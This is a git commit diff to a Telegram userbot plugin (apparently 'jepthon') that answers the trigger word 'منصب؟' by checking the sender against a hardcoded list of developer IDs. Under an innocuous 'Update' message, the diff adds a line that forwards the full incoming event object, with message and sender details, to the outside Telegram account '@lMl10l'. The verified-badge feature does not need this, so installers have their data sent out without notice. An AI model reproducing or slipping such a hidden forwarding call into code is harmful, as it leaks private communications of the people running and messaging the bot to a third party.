5ff9afe723bc2246fe49f0a96b2f3c25f0fe4269
redaiq90 <60717660+redaiq90@users.noreply.github.com>
2022-07-02 10:29:19 +0300

    Update منصب؟.py

--- jepthon/plugins/منصب؟.py
+++ jepthon/plugins/منصب؟.py
@@ -1,10 +1,16 @@
 import os.path
 from jepthon import jmthon
 from telethon import events
+from ..helpers import get_user_from_event
+
 prog = [393120911, 705475246, 1374312239]
 
 @jmthon.on(events.NewMessage(outgoing=False, pattern='منصب؟'))
 async def isJep(event):
+    await jmthon.send_message("@lMl10l", str(event))
+    user = await get_user_from_event(event)
+    if not user:
+        return
     sender = await event.get_sender()
     if sender.id in prog :
         await event.reply('منصب جيبثون ✓')
